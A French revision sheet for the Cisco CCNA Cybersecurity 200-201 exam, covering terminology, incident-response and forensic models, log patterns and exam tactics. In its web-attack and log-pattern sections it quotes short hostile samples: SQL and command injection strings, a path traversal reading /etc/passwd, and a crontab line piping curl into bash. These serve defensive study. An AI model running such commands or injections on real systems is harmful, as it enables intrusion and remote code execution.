# CCNA Cybersecurity 200-201 (CCNACBR v1.2) : fiche de révision express

> **Objectif** : ancrer la terminologie, les modèles et la nomenclature. Les technos, tu les connais. Ici on travaille le vocabulaire exact que l'examen attend, en anglais.
>
> **Mode d'emploi** : lis une section, puis enchaîne tout de suite sur les questions du même domaine dans l'entraîneur. La fiche sert de filet de sécurité, pas de cours.

## 1. L'examen en 30 secondes

| Élément | Valeur |
|---|---|
| Code et nom | 200-201 CCNACBR v1.2 (ex-CBROPS), certification **CCNA Cybersecurity** |
| Durée | 120 min (extension possible pour non anglophones, à vérifier sur la confirmation Pearson VUE) |
| Langue | Anglais uniquement |
| Questions | Environ 95 à 105 (non publié par Cisco) |
| Types | Choix unique, choix multiples (Choose two/three), drag-and-drop, exhibits (logs, pcap, alertes) |
| Labs | Non attendus : le blueprint n'utilise que Describe, Compare, Identify, Interpret, Map, Classify |
| Navigation | **Aucun retour arrière** : une question validée est définitive |
| Score | Échelle 300 à 1000, seuil non publié. Vise **85 %** à l'entraînement |

**Pondération** : D1 Security Concepts 20 %, D2 Security Monitoring 25 %, D3 Host-Based Analysis 20 %, D4 Network Intrusion Analysis 20 %, D5 Security Policies and Procedures 15 %.

**Stratégie sans retour arrière**

- Budget moyen : 70 secondes par question. Un exhibit long peut en prendre 120, une définition 20.
- Lis d'abord la **dernière phrase** de l'énoncé (ce qu'on te demande), ensuite l'exhibit.
- « Choose two » : le nombre est imposé. Élimine d'abord les propositions absurdes.
- Deux réponses vraies ? Prends la **plus spécifique** (PHI plutôt que PII) ou celle qui colle au mot clé de l'énoncé : *first, most, best, primary*.
- Bloqué depuis 2 minutes : tranche et avance. Toutes les questions pèsent pareil.

## 2. Les paires qui se confondent

C'est ici que se perdent les points quand on maîtrise la technique mais pas le vocabulaire.

| Terme A | Terme B | Comment trancher |
|---|---|---|
| Threat | Vulnerability | Danger potentiel vs faiblesse exploitable |
| Vulnerability | Attack surface | Une faiblesse précise vs la somme des points exposés |
| Exploit | Payload | Ce qui ouvre la porte vs ce qui est déposé derrière |
| Risk | Threat | Probabilité × impact vs le danger lui-même |
| DAC | MAC | Le propriétaire décide vs le système impose (labels) |
| Role-based | Rule-based | Fonction métier vs règles type ACL |
| SIEM | SOAR | Voir (corréler, alerter) vs agir (playbooks) |
| Threat intelligence | Threat hunting | S'informer sur le dehors vs chercher chez soi sur hypothèse |
| IDS | IPS | Copie du trafic, alerte vs inline, bloque |
| Tap | SPAN | Matériel passif sans perte vs mirroring du switch qui peut dropper |
| NetFlow | Full packet capture | La facture téléphonique vs l'enregistrement de l'appel |
| Session data | Transaction data | Résumé de la conversation vs requêtes et réponses dedans |
| Packet filtering | Stateful | ACL sans mémoire vs table d'états (toujours L3/L4) |
| Stateful | Deep packet inspection | L3/L4 vs contenu applicatif L7 |
| False positive | False negative | Alerte sans attaque vs attaque sans alerte (le pire) |
| False positive | Benign | Détection erronée vs détection exacte d'une activité légitime |
| SQL injection | Command injection | Exécuté par la base vs exécuté par l'OS |
| SQL injection | XSS | Cible le serveur vs cible le navigateur de la victime |
| Hashing | Encryption | Intégrité, irréversible vs confidentialité, réversible avec la clé |
| Symmetric | Asymmetric | Une clé partagée, rapide vs paire de clés, lent, sert à l'échange |
| IoC | IoA | **C**'est arrivé (artefact) vs **A**ction en cours (comportement) |
| Best evidence | Corroborative evidence | L'original vs ce qui confirme une autre preuve |
| Corroborative | Indirect evidence | Confirme vs suggère par déduction |
| Static analysis | Dynamic analysis | Sans exécuter vs exécution en sandbox |
| Allow listing | Block listing | Tout interdit sauf la liste vs tout permis sauf la liste |
| Precursor | Indicator | Pourrait arriver vs arrive ou est arrivé |
| IR policy | IR plan | Le cadre (rôles, autorité, sévérités) vs la feuille de route (mission, métriques, roadmap) |
| IR plan | Procedures (SOP) | La feuille de route vs le pas à pas (checklists, formulaires) |
| Containment | Eradication | Stopper la propagation vs supprimer la cause |
| Eradication | Recovery | Nettoyer vs remettre en production |
| NIST SP 800-61 | NIST SP 800-86 | Réponse à incident vs forensic |
| Weaponization | Delivery | Fabriquer l'arme vs la transmettre |
| Delivery | Exploitation | L'arme arrive vs elle se déclenche |
| Exploitation | Installation | Exécution du code vs persistance |
| Cyber Kill Chain | Diamond Model | 7 phases dans le temps vs 4 sommets d'un événement |
| Network profile | Server profile | Les flux vs ce qui tourne sur la machine |
| PII | PHI | Identifie une personne vs donnée de santé (sous-ensemble) |
| PII | PSI | Identité vs identifiants de sécurité (login, mot de passe) |
| Dwell time | MTTD | Durée de présence de l'attaquant vs temps moyen de détection |
| MTTC | Time to control | Contenir l'incident vs stopper la propagation du malware |
| CSIRT | PSIRT | Incidents d'une organisation vs failles des produits d'un éditeur |
| RADIUS | TACACS+ | UDP, chiffre le mot de passe vs TCP 49, chiffre tout, sépare AAA |

## 3. Les listes à connaître par cœur

| Modèle | Éléments, dans l'ordre | Mnémo |
|---|---|---|
| Cyber Kill Chain (7) | Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and control, Actions on objectives | *Real Warriors Deliver Exploits, Install Control, Act* |
| Diamond Model (4 sommets) | Adversary, Capability, Infrastructure, Victim | ACIV |
| Diamond meta-features (6) | Timestamp, Phase, Result, Direction, Methodology, Resources | |
| NIST SP 800-61 r2 (4) | Preparation, Detection and analysis, Containment eradication and recovery, Post-incident activity | P-D-C-P, et CER au milieu |
| NIST SP 800-86 (4) | Collection, Examination, Analysis, Reporting | CEAR |
| Order of volatility | Registres et cache CPU, RAM et tables (ARP, routage, processus), fichiers temporaires et swap, disque, logs distants, topologie physique, archives | Ce qui disparaît en premier se collecte en premier |
| Network profile (4) | Total throughput, Session duration, Ports used, Critical asset address space | |
| Server profile (5) | Listening ports, Logged-in users/service accounts, Running processes, Running tasks, Applications | |
| SOC metrics (5) | Dwell time, MTTD, MTTR, MTTC, Time to control | |
| Data types (6) | Full packet capture, Session, Transaction, Statistical, Metadata, Alert | |
| Evidence (3) | Best, Corroborative, Indirect | |
| Protected data (4) | PII, PSI, PHI, Intellectual property | |
| Vulnerability management (6) | Discover, Prioritize assets, Assess, Report, Remediate, Verify | |
| CVSS v3.x groups (3) | Base, Temporal, Environmental | |
| Syslog severities (0 à 7) | Emergency, Alert, Critical, Error, Warning, Notice, Informational, Debug | *Every Alley Cat Eats Watery Noodles In Doors* |
| TCP flags (6) | URG, ACK, PSH, RST, SYN, FIN | *Unskilled Attackers Pester Real Security Folks* |

## 4. Domaine 1 : Security Concepts (20 %)

**CIA** : Confidentiality (chiffrement, contrôle d'accès), Integrity (hash, signature, HMAC), Availability (redondance, sauvegardes, anti-DDoS). Dans un scénario, cherche le verbe : *read, disclosed* = C, *altered, modified* = I, *cannot access, down* = A.

**Déploiements (1.2)**

- Network, endpoint, application : NGFW et IPS, EDR et antimalware, WAF.
- Legacy antivirus = signatures. Antimalware moderne = heuristique, comportement, machine learning, cloud.
- Log management (stocker, chercher), SIEM (corréler, alerter), SOAR (orchestrer, automatiser).
- Conteneurs : noyau **partagé** avec l'hôte, isolation par namespaces et cgroups. VM : OS invité complet, isolation par l'hyperviseur.
- Cloud : shared responsibility. En IaaS le client gère l'OS invité, les applis, les données. Les **données et les accès restent toujours au client**. CASB = usage des SaaS, CSPM = mauvaises configurations, CWPP = workloads.

**Risque (1.4)** : risk = likelihood × impact. Quatre traitements : *avoidance, reduction (mitigation), sharing (transfer), retention (acceptance)*.

**Modèles de contrôle d'accès (1.6)**

| Modèle | Qui décide | Exemple |
|---|---|---|
| DAC | Le propriétaire de la ressource | ACL NTFS, chmod |
| MAC | Le système, via labels et habilitations | SELinux, classification militaire |
| Nondiscretionary / Role-based | L'administrateur, selon la fonction | Groupes AD par métier |
| Rule-based | Des règles globales | ACL de firewall |
| Time-based | L'horaire | Accès VPN 8h à 18h |
| Attribute-based | Une politique sur des attributs (utilisateur, ressource, contexte) | Accès si poste conforme et en France |

**CVSS v3.x (1.7)**

| Groupe | Métriques | À retenir |
|---|---|---|
| Base (exploitabilité) | Attack Vector (Network, Adjacent, Local, Physical), Attack Complexity (Low, High), Privileges Required (None, Low, High), User Interaction (None, Required) | Network + Low + None + None = le pire cas |
| Base (portée et impact) | Scope (Unchanged, Changed), Confidentiality, Integrity, Availability (High, Low, None) | Scope Changed = l'impact déborde du composant vulnérable |
| Temporal | Exploit Code Maturity, Remediation Level, Report Confidence | Évolue dans le temps |
| Environmental | Security Requirements (CR, IR, AR) et métriques de base modifiées | Propre à ton organisation |

Échelle : None 0.0, Low 0.1 à 3.9, Medium 4.0 à 6.9, High 7.0 à 8.9, Critical 9.0 à 10.0.

**Visibilité et détection (1.8 à 1.11)**

- Défis de visibilité : chiffrement, NAT, tunnels côté réseau. Agents absents ou logs désactivés côté hôte. Pas d'accès au réseau sous-jacent côté cloud (on dépend des API et des flow logs).
- Perte de données dans un profil de trafic : gros volume sortant, horaires inhabituels, destination rare, DNS anormal (tunneling), protocole inattendu.
- 5-tuple : src IP, dst IP, src port, dst port, protocol. C'est la clé pour recouper firewall, proxy, NetFlow et IDS et isoler l'hôte compromis.
- Rule-based (signatures, connu) vs behavioral (écart de comportement) vs statistical (écart chiffré à une baseline). Les deux derniers attrapent l'inconnu, avec plus de faux positifs.

## 5. Domaine 2 : Security Monitoring (25 %)

**Technologie vers type de données (2.2)**

| Technologie | Ce qu'elle fournit |
|---|---|
| tcpdump | Paquets complets (pcap), filtres BPF |
| NetFlow | Métadonnées de flux : 5-tuple, octets, paquets, durée, flags. Pas de payload |
| NGFW | Application, utilisateur, événements IPS, URL, fichiers, en plus du 5-tuple |
| Stateful firewall | 5-tuple, état de connexion, permit ou deny |
| AVC | Identification d'application L7 quel que soit le port |
| Web content filtering | URL, catégorie, utilisateur, action (proxy) |
| Email content filtering | Expéditeur, destinataire, objet, pièces jointes, verdict |

**Impact sur la visibilité (2.3)**

| Technologie | Effet |
|---|---|
| ACL | Ce qui est bloqué en amont n'atteint jamais les sondes en aval |
| NAT/PAT | Masque les IP internes, il faut les logs de traduction |
| Tunneling, encapsulation | Un protocole caché dans un autre (DNS, ICMP, GRE, VPN) |
| Tor | Destination et origine masquées par relais chiffrés |
| Encryption | Payload illisible : restent métadonnées, SNI, JA3, ou déchiffrement TLS |
| P2P | Pas de serveur central, ports dynamiques, difficile à filtrer |
| Load balancing | Le serveur voit l'IP du répartiteur (X-Forwarded-For) |

**Attaques à nommer (2.5 à 2.9)**

- Réseau : SYN flood, amplification et reflection (DNS, NTP), ARP spoofing, DNS poisoning, on-path (MITM).
- Web : SQL injection (`' OR 1=1 --`), command injection (`; cat /etc/passwd`), XSS (`<script>`), directory traversal (`../../`).
- Social engineering : phishing, spear phishing, whaling, vishing, smishing, pretexting, baiting, tailgating. Version IA générative : textes sans fautes, personnalisation de masse, deepfakes voix et vidéo.
- Endpoint : buffer overflow, C2 (beaconing), malware (virus, worm, trojan, rootkit, fileless), ransomware.
- Évasion : tunneling, chiffrement, proxies, fragmentation, resource exhaustion, timing lent, traffic substitution.

**Certificats et PKI (2.10, 2.11)**

| Composant | À retenir |
|---|---|
| Cipher suite | Key exchange + authentication + bulk cipher + hash. Ex : ECDHE-RSA-AES256-GCM-SHA384 |
| X.509 | Format du certificat : subject, issuer, validité, clé publique, SAN, signature |
| Key exchange | RSA (pas de PFS), DHE et ECDHE (Perfect Forward Secrecy) |
| Protocol version | SSLv3, TLS 1.0 et 1.1 obsolètes. TLS 1.2 et 1.3 acceptés |
| PKCS | #7 chaîne de certificats, #10 CSR, #12 certificat + clé privée (.pfx, .p12) |

Seule la **clé publique** (dans le certificat) traverse le réseau. La clé privée ne quitte jamais le serveur. L'asymétrique établit la session, le symétrique chiffre les données. Côté SOC, le chiffrement aveugle l'inspection : il faut du déchiffrement TLS (CA interne de confiance) ou se contenter des métadonnées.

## 6. Domaine 3 : Host-Based Analysis (20 %)

**Technologies endpoint (3.1)** : HIDS (intégrité de fichiers, logs, processus), antimalware/antivirus, host-based firewall, application allow listing et block listing, systems-based sandboxing, predictive AI (machine learning qui classe l'inconnu sans signature).

**Composants Windows (3.2)** : process, thread, handle, service. Registre : HKLM, HKCU, HKU, HKCR, HKCC, persistance dans `Run` et `RunOnce`. NTFS : MFT, horodatages MACE, Alternate Data Streams. WMI. Commandes : `tasklist`, `netstat -ano`, `Get-Process`, `net user`, `schtasks`.

**Composants Linux (3.2)** : daemon, fork, PID 1 (systemd), permissions rwx et SUID, symlink vs hard link. Logs : `/var/log/auth.log` (Debian) ou `/var/log/secure` (RHEL), `/var/log/syslog` ou `messages`, `journalctl`. Commandes : `ps aux`, `ss -tulpn`, `lsof -i`, `last`, `crontab -l`.

**Event IDs Windows**

| ID | Signification |
|---|---|
| 4624 / 4625 | Logon réussi / échoué |
| 4648 | Logon avec identifiants explicites (runas) |
| 4672 | Privilèges spéciaux attribués (admin) |
| 4688 | Création de process |
| 4720 / 4732 | Compte créé / ajout à un groupe local |
| 7045 | Service installé (PsExec, persistance) |
| 1102 | Journal de sécurité effacé |

Logon types : 2 interactif, 3 réseau, 4 batch, 5 service, 7 déverrouillage, 10 RDP.

**Attribution (3.3)** : assets, threat actor, IoC, IoA, chain of custody. **Evidence (3.4)** : best, corroborative, indirect.

**Motifs à reconnaître dans les logs (3.5)**

- Rafale de 4625 puis un 4624 : brute force réussi.
- 1102 juste après une activité admin : effacement de traces.
- 7045 avec un binaire dans `C:\Windows\Temp` ou `ADMIN$` : exécution distante.
- `powershell -enc` + base64 : commande obfusquée.
- `GET /../../etc/passwd` avec un code 200 : traversal réussi.
- `* * * * * curl http://x | bash` dans une crontab : persistance Linux.
- Log SIEM : règle de corrélation (impossible travel, échecs multiples). Log SOAR : étapes de playbook (enrich, block, isolate, ticket).

**Rapport de sandbox (3.6)** : hashes (identifier l'échantillon, chercher sa réputation), URLs, domaines et IP (IoC réseau), comportements système (fichiers créés, clés de registre, process, mutex), score de menace.

## 7. Domaine 4 : Network Intrusion Analysis (20 %)

**Reconnaître la source d'un événement (4.1)**

| Indice dans le log | Source |
|---|---|
| `[**] [1:2013028:4] ET ... [**]`, priorité, classification | IDS/IPS (Snort, Suricata) |
| `%ASA-6-302013`, `%ASA-4-106023`, Built, Teardown, Deny | Firewall |
| Nom d'application (BitTorrent, Facebook) + action | Network application control (AVC, NGFW) |
| `TCP_MISS/200`, URL complète, méthode, user-agent | Proxy |
| Nom de malware, chemin de fichier, action quarantine | Antivirus |
| Durée, paquets, octets, flags, pas de payload | Transaction data (NetFlow) |

**Matrice des alertes (4.2)**

| | Attaque réelle | Pas d'attaque |
|---|---|---|
| Alerte | True positive | False positive |
| Pas d'alerte | **False negative** (le pire) | True negative |

Benign : l'alerte est exacte, mais l'activité est légitime (scan de vulnérabilités autorisé).

**Comparaisons (4.3 à 4.5)**

- Packet filtering : ACL sans état, L3/L4. Stateful : table d'états, autorise le retour, L3/L4. DPI : contenu L7, signatures, applications.
- Inline (IPS) : peut bloquer, ajoute latence et point de panne. Tap ou SPAN (IDS) : copie, aucun impact, ne bloque rien.
- Tap/capture : paquets complets, analyse du payload, stockage lourd. NetFlow : résumé, rétention longue, pas de contenu.

**Wireshark et pcap (4.6, 4.7)** : *File > Export Objects* (HTTP, SMB), *Follow TCP Stream* puis enregistrer en raw. Éléments clés d'une intrusion : adresses et ports source et destination, protocoles, payload. Port well-known = serveur, port éphémère = client.

**En-têtes (4.8)**

| Protocole | Champs utiles à l'analyse |
|---|---|
| Ethernet | MAC source et destination, EtherType (0x0800 IPv4, 0x0806 ARP, 0x86DD IPv6) |
| IPv4 | TTL (64 Linux, 128 Windows, 255 réseau), Protocol (1 ICMP, 6 TCP, 17 UDP), fragmentation |
| IPv6 | Hop limit, Next header |
| TCP | Ports, seq et ack, flags, window |
| ICMP | Type 8 echo request, 0 reply, 3 unreachable, 11 time exceeded. Payload gros ou variable = tunnel |
| DNS | Types A, AAAA, MX, TXT, CNAME, PTR. Sous-domaines longs et aléatoires ou TXT massifs = tunneling |
| Mail | SMTP 25/587, POP3 110/995, IMAP 143/993 |
| HTTP | Méthode, Host, User-Agent, Referer, codes 200, 301/302, 401, 403, 404, 500 |
| HTTPS | SNI lisible dans le ClientHello, empreinte JA3 |
| HTTP/2 | Trames binaires, multiplexage de streams, compression HPACK, pseudo-headers `:method`, `:path`, `:authority` |
| ARP | who-has et is-at. Une même IP annoncée par deux MAC = spoofing |

**Artefacts (4.9)** : IP source et destination, identité client/serveur par le port, process (fichier ou registre), appels API système, hashes, URI et URL.

**Regex (4.10)**

| Motif | Sens |
|---|---|
| `.` `*` `+` `?` | Un caractère, 0 ou plus, 1 ou plus, 0 ou 1 |
| `^` `$` | Début, fin de ligne |
| `[abc]` `[^abc]` `[a-z]` | Classe, négation, intervalle |
| `\d` `\w` `\s` | Chiffre, caractère de mot, espace |
| `{n}` `{n,m}` | Répétition exacte, bornée |
| `(a\|b)` | Alternative |
| `\.` | Point littéral (échappé) |

Exemple : `^192\.168\.\d{1,3}\.\d{1,3}$` matche une IP en 192.168.x.x.

## 8. Domaine 5 : Security Policies and Procedures (15 %)

**Management (5.1)** : asset (inventaire), configuration (baseline, drift), MDM (mobiles, remote wipe), patch (agent-based, agentless scanning, passive network monitoring), vulnerability (cycle en 6 étapes).

**NIST SP 800-61 r2 (5.2 à 5.5)**

| Document | Contenu |
|---|---|
| Policy | Engagement de la direction, objectifs, périmètre, définitions, rôles et niveaux d'autorité, sévérités, mesures de performance, formulaires |
| Plan | Mission, stratégies et objectifs, approbation de la direction, approche organisationnelle, communication, métriques, roadmap, intégration dans l'organisation |
| Procedures (SOP) | Processus techniques, checklists, formulaires |

| Phase | Ce qu'on y range |
|---|---|
| Preparation | Former le CSIRT, outils, jump kit, **prévention** (risk assessment, sensibilisation) |
| Detection and analysis | Vecteurs d'attaque, precursors et indicators, analyse, documentation, **priorisation**, notification |
| Containment, eradication and recovery | Stratégie de confinement, **collecte de preuves**, identification de l'attaquant, nettoyage, remise en production |
| Post-incident activity | Lessons learned, exploitation des données d'incident, **evidence retention** |

- Vecteurs d'attaque : external/removable media, **attrition** (brute force, DDoS), web, email, **impersonation** (spoofing, MITM, rogue AP), **improper usage** (utilisateur autorisé qui viole la charte), loss or theft of equipment.
- Priorisation : functional impact, information impact (none, privacy breach, proprietary breach, integrity loss), recoverability (regular, supplemented, extended, not recoverable).
- Critères de confinement : dommages potentiels, préservation des preuves, disponibilité du service, temps et ressources, efficacité, durée de la solution.
- Équipes : central, distributed, coordinating. Staffing : employees, partially outsourced, fully outsourced.

**Parties prenantes (5.5)** : Management (politiques, budget, coordination), Information assurance (changer des règles firewall), IT support (connaît la techno, préserve les preuves), Legal (conformité, poursuites), Public affairs (presse, public), Human resources (sanctions), Business continuity planners (ajuster les plans), Physical security and facilities (intrusion physique, locaux des preuves). **CMMC** : maturité cyber des sous-traitants du DoD, domaine IR à 5 capacités (plan, detect and report, respond, post-incident review, test).

**NIST SP 800-86 (5.6)** : Collection, Examination, Analysis, Reporting. Intégrité : write blocker, image bit à bit, hash de l'original et de la copie, travail sur la copie. Préservation : ne pas éteindre avant d'avoir capturé la mémoire. Outils lancés depuis un support de confiance, jamais les binaires de l'hôte compromis.

**Données protégées (5.9)** : PII, PSI, PHI (HIPAA), intellectual property. PCI DSS = cartes bancaires, GDPR = données personnelles UE, SOX = reporting financier.

**Cyber Kill Chain (5.10)**

| Phase | Mot clé dans l'énoncé |
|---|---|
| Reconnaissance | harvesting, scanning, OSINT |
| Weaponization | couples exploit with payload, builds, no target yet |
| Delivery | email attachment, USB, malicious link, drive-by |
| Exploitation | vulnerability triggered, code executes |
| Installation | backdoor, persistence, registry Run key, service, web shell |
| Command and control | beacon, callback, receives instructions |
| Actions on objectives | exfiltration, encryption, destruction, lateral movement |

**Diamond Model** : un événement = un adversaire déploie une capacité via une infrastructure contre une victime. *Pivoting* = partir d'un sommet connu pour découvrir les autres. MITRE ATT&CK (hors blueprint strict) : tactic = le pourquoi, technique = le comment.

**Métriques SOC (5.11)**

| Métrique | Définition |
|---|---|
| Dwell time | Durée d'accès de l'attaquant avant détection et arrêt |
| MTTD | Temps moyen pour identifier un incident valide |
| MTTR | Temps moyen pour stopper et remédier (respond) |
| MTTC | Temps pour empêcher l'incident de causer plus de dégâts |
| Time to control | Temps pour stopper la propagation du malware |

Lien avec le scope : détection tardive = plus d'hôtes, de comptes et de données à examiner, et une rétention de logs qui peut ne plus couvrir le début de l'intrusion.

## 9. Pièges de version et de nommage

- **NIST SP 800-61** : la r3 (avril 2025) remplace la r2 et s'aligne sur le CSF 2.0. Le blueprint garde les 4 phases de la r2. Apprends la r2.
- **CVSS** : examen en v3.x (Scope, Temporal, Environmental). La v4.0 supprime Scope et renomme Temporal en Threat.
- **NetFlow** : le blueprint le range dans « transaction data » (4.1, 4.5), alors que beaucoup de cours le classent en session data. Si l'énoncé dit *transactional data (NetFlow)*, ne tique pas.
- **Produits Cisco renommés** : Threat Grid = Secure Malware Analytics, Stealthwatch = Secure Network Analytics, AMP for Endpoints = Secure Endpoint, Firepower = Secure Firewall. Talos = threat intelligence, Umbrella = sécurité DNS.
- **Points récents du blueprint** : social engineering par IA générative (2.7), predictive AI (3.1), logs SIEM et SOAR (3.5), conteneurs (1.2.e), threat modeling et DevSecOps (1.3), HTTP/2 (4.8.i), IoA (3.3.d), CMMC (5.5).

## 10. Jour J

1. Vérifie la durée exacte sur ta confirmation Pearson VUE (extension non anglophone).
2. En ligne (OnVUE) : bureau vide, pas de main devant la bouche, pas de lecture à voix haute, webcam stable.
3. Première passe mentale : « qu'est-ce qu'on me demande ? » avant de lire l'exhibit.
4. Rythme : un coup d'œil au chrono toutes les 20 questions. À mi-temps tu dois avoir dépassé la moitié.
5. Drag-and-drop : place d'abord les associations dont tu es sûr, le reste se déduit.
6. Pas de retour arrière : ne rumine pas la question précédente, elle est partie.

## 11. Plan de révision avec l'entraîneur

1. **Diagnostic** : un examen blanc mi-format (50 questions) pour situer chaque domaine.
2. **Boucle par domaine**, en commençant par le plus faible : section de la fiche (5 minutes), puis session de 20 questions, puis « Rejouer mes erreurs ».
3. **Terminologie tous les jours** : 10 minutes de flashcards, d'abord terme vers définition, puis définition vers terme.
4. **Quiz dynamique en chat** : volées de 5 questions avec justification, pour travailler le raisonnement et les zones que l'app signale comme faibles.
5. **Validation** : deux examens blancs complets à 85 % ou plus, à plusieurs jours d'écart, avant de réserver le créneau.
